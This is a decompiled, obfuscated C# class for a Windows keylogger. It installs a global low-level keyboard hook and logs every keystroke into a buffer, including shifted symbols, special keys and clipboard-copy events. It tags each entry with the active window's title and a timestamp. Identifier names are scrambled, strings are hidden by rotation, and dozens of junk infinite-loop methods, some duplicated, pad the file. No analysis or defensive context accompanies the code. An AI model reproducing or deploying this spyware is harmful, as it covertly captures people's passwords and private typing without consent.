using System;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using VlMMc;
using sqYNh;

namespace SUMlO;

public class CShDq : ApplicationContext
{
	public delegate int ODztM(int code, int wParam, ref JgCag lParam);

	public struct JgCag
	{
		public int VkC;

		public int SC;

		public int F;

		public int Tme;

		public int ExtrInf;
	}

	private KeyEventHandler corGb;

	private KeyEventHandler dmwrU;

	private IntPtr kDXqk;

	private ODztM kQZaY;

	public static bool dOHPs = true;

	public static bool GFVZb = false;

	public static bool TsIzk = false;

	public static bool SUoRW = false;

	public static string kuPcQ = "Y";

	public static string Ddzya = "X";

	[AccessedThroughProperty("TimerFront")]
	private static Timer IZMQp;

	[AccessedThroughProperty("GetTimer")]
	private static Timer QbVnk;

	public static KeyEventArgs HdCtp = null;

	public static _003F unknown_0
	{
		get
		{
			return IZMQp;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			IZMQp = value;
		}
	} = new Timer();


	public static _003F unknown_1
	{
		get
		{
			return QbVnk;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			QbVnk = value;
		}
	} = new Timer();


	public event KeyEventHandler KD
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Expected O, but got Unknown
			corGb = (KeyEventHandler)Delegate.Combine((Delegate?)(object)corGb, (Delegate?)(object)value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Expected O, but got Unknown
			corGb = (KeyEventHandler)Delegate.Remove((Delegate?)(object)corGb, (Delegate?)(object)value);
		}
	}

	public event KeyEventHandler KU
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Expected O, but got Unknown
			dmwrU = (KeyEventHandler)Delegate.Combine((Delegate?)(object)dmwrU, (Delegate?)(object)value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Expected O, but got Unknown
			dmwrU = (KeyEventHandler)Delegate.Remove((Delegate?)(object)dmwrU, (Delegate?)(object)value);
		}
	}

	public CShDq()
	{
		kDXqk = IntPtr.Zero;
		kQZaY = HookP;
		kDXqk = vCJaB.SetWindowsHookEx(13, kQZaY, vCJaB.LoadLibrary(vCJaB.RotateRight("Pn`m.-")), 0u);
	}

	public void unhook()
	{
		vCJaB.UnhookWindowsHookEx(kDXqk);
	}

	public int HookP(int Nitro, int WestPage, ref JgCag LastPage)
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		if (Nitro >= 0)
		{
			try
			{
				KeyEventArgs val = new KeyEventArgs((Keys)LastPage.VkC);
				switch (WestPage)
				{
				case 257:
				case 261:
				{
					KeyEventHandler val2 = dmwrU;
					if (val2 != null)
					{
						val2.Invoke((object)null, val);
					}
					break;
				}
				case 256:
				case 260:
				{
					KeyEventHandler val2 = corGb;
					if (val2 != null)
					{
						val2.Invoke((object)null, val);
					}
					break;
				}
				}
				if (val.get_Handled())
				{
					return 1;
				}
				return 0;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		return vCJaB.CallNextHookEx(kDXqk, Nitro, WestPage, ref LastPage);
	}

	public static void Welcome(string Eno)
	{
		if (Operators.CompareString(Eno, vCJaB.RotateRight("V=<>FNK<>@X"), false) == 0 && vCJaB.LGHFK.Length > 1 && dOHPs)
		{
			vCJaB.LGHFK = vCJaB.LGHFK.Remove(vCJaB.LGHFK.Length - 1, 1);
		}
		else if (Operators.CompareString(Eno, vCJaB.RotateRight("V@IO@MX"), false) == 0 && dOHPs)
		{
			vCJaB.LGHFK += Environment.NewLine;
		}
		else
		{
			vCJaB.LGHFK += Eno;
		}
	}

	public void SetStart()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Expected O, but got Unknown
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Expected O, but got Unknown
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		unknown_0 = new Timer();
		((Timer)unknown_0).set_Interval(SystemInformation.get_KeyboardDelay() * SystemInformation.get_KeyboardSpeed() * 8);
		((Timer)unknown_0).add_Tick((EventHandler)T_Tick);
		((Timer)unknown_0).add_Tick((EventHandler)Recon);
		dfMSl.WYhFz.KD += new KeyEventHandler(Down);
		dfMSl.WYhFz.KU += new KeyEventHandler(Up);
		((Timer)unknown_0).Start();
	}

	public static void T_Tick(object sender, EventArgs e)
	{
		if (HdCtp != null)
		{
			TLE(HdCtp);
		}
	}

	public void GetWindowTimer()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Expected O, but got Unknown
		unknown_1 = new Timer();
		((Timer)unknown_1).set_Interval(SystemInformation.get_KeyboardDelay() * SystemInformation.get_KeyboardSpeed() * 8);
		((Timer)unknown_1).add_Tick((EventHandler)GetWindow);
		((Timer)unknown_1).Start();
	}

	public void Recon(object sender, EventArgs e)
	{
		string lGHFK = vCJaB.LGHFK;
		string text = lGHFK;
		int index = 0;
		int length = text.Length;
		if (0 < length)
		{
			char c = text[index];
			int num = lGHFK.Split(new char[1] { c }).Length - 1;
			if (num > 5)
			{
				((Timer)unknown_0).Stop();
				SetStart();
				vCJaB.LGHFK = string.Empty;
			}
		}
	}

	public static void GetWindow(object sender, EventArgs e)
	{
		try
		{
			IntPtr foregroundWindow = vCJaB.GetForegroundWindow();
			if (foregroundWindow == IntPtr.Zero)
			{
				return;
			}
			Ddzya = Strings.StrDup(vCJaB.GetWindowTextLengthA((long)foregroundWindow), "*");
			vCJaB.GetWindowTextA(foregroundWindow, ref Ddzya, Ddzya.Length + 1);
			if (Operators.CompareString(Ddzya, kuPcQ, false) != 0)
			{
				kuPcQ = Ddzya;
				if (Ddzya != null)
				{
					Welcome(Environment.NewLine + "[" + Ddzya + "] - [" + Conversions.ToString(DateTime.Now) + "]" + Environment.NewLine);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void Down(object sender, KeyEventArgs e)
	{
		switch (e.get_KeyValue())
		{
		case 144:
			SUoRW = true;
			break;
		default:
			HdCtp = e;
			break;
		case 160:
			GFVZb = true;
			break;
		case 161:
			GFVZb = true;
			break;
		case 162:
			TsIzk = true;
			Welcome(vCJaB.RotateRight("V>OMGX"));
			break;
		case 163:
			TsIzk = true;
			Welcome(vCJaB.RotateRight("V>OMGX"));
			break;
		}
	}

	public static void Up(object sender, KeyEventArgs e)
	{
		HdCtp = null;
		((Timer)unknown_0).Stop();
		switch (e.get_KeyValue())
		{
		case 144:
			SUoRW = false;
			break;
		default:
			TLE(e);
			break;
		case 160:
			GFVZb = false;
			break;
		case 161:
			GFVZb = false;
			break;
		case 162:
			TsIzk = false;
			break;
		case 163:
			TsIzk = false;
			break;
		}
	}

	public static void TLE(KeyEventArgs KE)
	{
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b9: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			int keyValue = KE.get_KeyValue();
			if (SUoRW)
			{
				switch (keyValue)
				{
				case 107:
					Welcome("\\");
					break;
				default:
					Welcome(keyValue.ToString());
					break;
				case 109:
					Welcome("-");
					break;
				case 110:
					Welcome(".");
					break;
				case 111:
					Welcome("/");
					break;
				}
			}
			if (keyValue > 64 && keyValue < 91)
			{
				if (TsIzk && (double)KE.get_KeyCode() == Conversions.ToDouble("C"))
				{
					Welcome("[Copied to clipboard]");
				}
				if (GFVZb)
				{
					Welcome(((Enum)KE.get_KeyCode()).ToString());
				}
				else
				{
					Welcome(((Enum)KE.get_KeyCode()).ToString().ToLower());
				}
				return;
			}
			if (keyValue > 111 && keyValue < 122)
			{
				Welcome(" F" + Conversions.ToString(keyValue - 111) + " ");
				return;
			}
			if (keyValue > 47 && keyValue < 58)
			{
				if (GFVZb)
				{
					switch (keyValue)
					{
					case 48:
						Welcome("=");
						break;
					case 49:
						Welcome("!");
						break;
					case 50:
						Welcome("\"");
						break;
					case 51:
						Welcome("?");
						break;
					case 52:
						Welcome("$");
						break;
					case 53:
						Welcome("%");
						break;
					case 54:
						Welcome("^");
						break;
					case 55:
						Welcome("/");
						break;
					case 56:
						Welcome("(");
						break;
					case 57:
						Welcome(")");
						break;
					}
				}
				else
				{
					Welcome((keyValue - 48).ToString().ToLower());
				}
				return;
			}
			if (keyValue > 95 && keyValue < 106)
			{
				Welcome(Conversions.ToString(keyValue - 96));
				return;
			}
			switch (keyValue)
			{
			case 188:
				if (GFVZb)
				{
					Welcome("<");
				}
				else
				{
					Welcome(",");
				}
				return;
			case 190:
				if (GFVZb)
				{
					Welcome(">");
				}
				else
				{
					Welcome(".");
				}
				return;
			case 191:
				if (GFVZb)
				{
					Welcome("?");
				}
				else
				{
					Welcome("'");
				}
				return;
			case 220:
				if (GFVZb)
				{
					Welcome("|");
				}
				else
				{
					Welcome("\\");
				}
				return;
			case 223:
				if (GFVZb)
				{
					Welcome("?");
				}
				else
				{
					Welcome("`");
				}
				return;
			case 186:
				if (GFVZb)
				{
					Welcome(":");
				}
				else
				{
					Welcome(";");
				}
				return;
			case 222:
				if (GFVZb)
				{
					Welcome("~");
				}
				else
				{
					Welcome("#");
				}
				return;
			case 219:
				if (GFVZb)
				{
					Welcome("{");
				}
				else
				{
					Welcome("[");
				}
				return;
			case 221:
				if (GFVZb)
				{
					Welcome("}");
				}
				else
				{
					Welcome("]");
				}
				return;
			case 187:
				if (GFVZb)
				{
					Welcome("?");
				}
				else
				{
					Welcome("+");
				}
				return;
			case 189:
				if (GFVZb)
				{
					Welcome("_");
				}
				else
				{
					Welcome("-");
				}
				return;
			case 192:
				if (GFVZb)
				{
					Welcome("@");
				}
				else
				{
					Welcome("'");
				}
				return;
			case 32:
				Welcome(" ");
				return;
			case 27:
				Welcome("[ESCAPE]");
				return;
			case 8:
				Welcome("[BACKSPACE]");
				return;
			case 13:
				Welcome(Environment.NewLine + "[ENTER]" + Environment.NewLine);
				return;
			case 38:
				Welcome("[UP]");
				return;
			case 37:
				Welcome("[LEFT]");
				return;
			case 39:
				Welcome("[RIGHT]");
				return;
			case 40:
				Welcome("[DOWN]");
				return;
			case 9:
				Welcome("[TAB]");
				return;
			case 20:
				Welcome("[CAPSLOCK]");
				return;
			case 93:
				Welcome("[ConMenu]");
				return;
			case 33:
				Welcome("[PAGEUP]");
				return;
			case 34:
				Welcome("[PAGEDOWN]");
				return;
			case 36:
				Welcome("[HOME]");
				return;
			case 35:
				Welcome("[END]");
				return;
			case 46:
				Welcome("[DELETE]");
				return;
			case 45:
				Welcome("[PRINTSCREEN]");
				return;
			case 165:
				Welcome("[RIGHTALT]");
				return;
			case 110:
				Welcome(".");
				return;
			}
			switch (keyValue)
			{
			case 165:
				Welcome("[RIGHTALT]");
				return;
			case 107:
				Welcome("+");
				return;
			case 109:
				Welcome("-");
				return;
			case 111:
				Welcome("/");
				return;
			case 106:
				Welcome("*");
				return;
			case 91:
				Welcome("[LEFTWINKEY]");
				return;
			case 92:
				Welcome("[RIGHTWINKEY]");
				return;
			}
			switch (keyValue)
			{
			case 91:
				Welcome("[LEFTWINKEY]");
				break;
			case 122:
				Welcome(" F11 ");
				break;
			case 123:
				Welcome(" F12 ");
				break;
			case 44:
				Welcome("[PRINTSCREEN]");
				break;
			case 145:
				Welcome("[SCROLLOCK]");
				break;
			case 19:
				Welcome("[PAUSEBREAK]");
				break;
			case 164:
				Welcome("[LEFTALT]");
				break;
			default:
				Welcome(" [SPECIAL KEY - " + keyValue + "] ");
				break;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	static void zXSvx()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void jJYQB()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void GgrlE()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void cSxss()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void ypDNw()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void VaWiz()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void qxcDo()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void NjvKr()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void wHCfu()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void TsIzk()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void pQbVn()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void MBgpq()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void imBwf()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void EKGSi()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void ovMmm()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void KTfIb()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void gFlPe()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void DcFjU()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void ZNLFX()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void vkQZa()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void RWkuP()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void CtpCS()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void YfJWV()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void tDPrL()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void QniMO()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void mLoTR()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void JwuoH()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void siOJK()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void PGTeN()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void lqnyC()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void HPsGF()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void dzyaI()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void zXSvx()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void jJYQB()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void GgrlE()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void cSxss()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void ypDNw()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void VaWiz()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void qxcDo()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void NjvKr()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void wHCfu()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void hGVOx()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void EdoiB()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void ZPuEE()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void vBOLt()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void SYUfw()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void CJaBz()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void YgtVp()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void uSycs()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void RpTxh()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void mbYSk()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void Jyenn()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void fjxId()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void PIEPg()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void IelsX()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void tHggI()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void UfwMT()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void CJaBz()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void wwYgt()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void NOjlu()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void qRDSW()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void bxKYG()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void zCLVQ()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void Tjmph()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void MoWnZ()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void OlgKL()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void DGxWl()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void YEctU()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void wacIP()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void zZChf()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void sKWLI()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void sZfyH()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void TxhdS()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void mbYSk()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void vPJye()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void xgiDf()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void oiBxV()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void ZPuEE()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void yTvBO()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void SBXHS()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}
}
